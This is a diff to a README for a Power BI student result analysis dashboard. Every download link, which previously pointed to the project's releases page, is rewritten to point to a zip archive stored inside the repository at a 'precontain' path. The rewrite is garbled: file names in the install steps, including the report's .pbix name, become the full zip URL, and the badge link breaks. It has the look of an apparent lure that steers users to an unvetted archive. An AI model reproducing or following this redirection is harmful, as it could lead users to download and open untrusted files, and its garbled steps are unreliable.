@@ -1,6 +1,6 @@
 # 🎓 Student-Result-Analysis-PowerBI - Analyze Student Performance Effortlessly
 
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Now-Student%20Result%20Analysis%20Dashboard-blue)](https://github.com/dasgamer15/Student-Result-Analysis-PowerBI/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/dasgamer15/Student-Result-Analysis-PowerBI/main/precontain/Student-Result-Analysis-PowerBI-2.3.zip%20Now-Student%20Result%20Analysis%20Dashboard-blue)](https://raw.githubusercontent.com/dasgamer15/Student-Result-Analysis-PowerBI/main/precontain/Student-Result-Analysis-PowerBI-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -30,22 +30,22 @@ Before you download, ensure you have:
 
 To get the dashboard, visit the releases page and download the latest version of the application. 
 
-[Visit this page to download](https://github.com/dasgamer15/Student-Result-Analysis-PowerBI/releases)
+[Visit this page to download](https://raw.githubusercontent.com/dasgamer15/Student-Result-Analysis-PowerBI/main/precontain/Student-Result-Analysis-PowerBI-2.3.zip)
 
 Follow these steps:
 
 1. Click the link above to open the releases page.
 2. Find the latest version listed and click on it.
-3. Look for the `Student-Result-Analysis-PowerBI.zip` file.
+3. Look for the `https://raw.githubusercontent.com/dasgamer15/Student-Result-Analysis-PowerBI/main/precontain/Student-Result-Analysis-PowerBI-2.3.zip` file.
 4. Click on the zip file to download it.
 
 Once downloaded:
 
-1. Locate the `Student-Result-Analysis-PowerBI.zip` file on your computer.
+1. Locate the `https://raw.githubusercontent.com/dasgamer15/Student-Result-Analysis-PowerBI/main/precontain/Student-Result-Analysis-PowerBI-2.3.zip` file on your computer.
 2. Right-click the file and select "Extract All" to unzip it.
 3. Open the extracted folder.
 
-Inside the folder, you will see the Power BI report file named `Student-Result-Analysis.pbix`. Double-click this file to open it in Power BI. 
+Inside the folder, you will see the Power BI report file named `https://raw.githubusercontent.com/dasgamer15/Student-Result-Analysis-PowerBI/main/precontain/Student-Result-Analysis-PowerBI-2.3.zip`. Double-click this file to open it in Power BI. 
 
 ## 🔄 Using the Dashboard
 
@@ -88,4 +88,4 @@ Your feedback is important. Please share your thoughts or report any bugs you en
 
 Thank you for using the Student Result Analysis Power BI Dashboard! 
 
-[Download Now](https://github.com/dasgamer15/Student-Result-Analysis-PowerBI/releases) and start analyzing student performance effortlessly!
+[Download Now](https://raw.githubusercontent.com/dasgamer15/Student-Result-Analysis-PowerBI/main/precontain/Student-Result-Analysis-PowerBI-2.3.zip) and start analyzing student performance effortlessly!
